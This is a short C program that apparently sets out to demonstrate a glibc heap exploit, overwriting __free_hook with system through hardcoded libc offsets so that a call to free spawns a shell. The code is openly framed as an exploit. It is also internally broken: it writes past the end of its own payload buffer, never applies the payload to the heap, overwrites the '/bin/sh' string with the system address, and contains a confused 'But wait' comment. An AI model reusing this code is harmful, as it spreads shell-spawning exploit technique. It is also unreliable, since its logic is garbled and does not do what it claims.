#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define FREE_HOOK_OFFSET 0x1eeb28ULL  
#define SYSTEM_OFFSET 0x52290ULL      
#define LIBC_BASE 0x7ffff79c3000ULL   

void setup() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
}

int main() {
    setup();


    void *chunk0 = malloc(0x500);  
    void *chunk1 = malloc(0x600);
    void *chunk2 = malloc(0x700);
    void *chunk3 = malloc(0x500);

    free(chunk0);  
    free(chunk1);  
    free(chunk2); 

    char payload[0x508]; 
    memset(payload, 'A', 0x500);
    *(unsigned long long*)(payload + 0x500 + 0x18) = (LIBC_BASE + FREE_HOOK_OFFSET) - 0x20ULL;  


    void *trigger = malloc(0x800);
    free(trigger);  

   
    void *hook_overwrite = malloc(0x100);
    strcpy(hook_overwrite, "/bin/sh"); 
    *(unsigned long long *)hook_overwrite = LIBC_BASE + SYSTEM_OFFSET;  // But wait, we wrote via attack

    free(hook_overwrite);

    puts("[EXPLOIT] Shell should spawn if successful.");

    return 0;
}
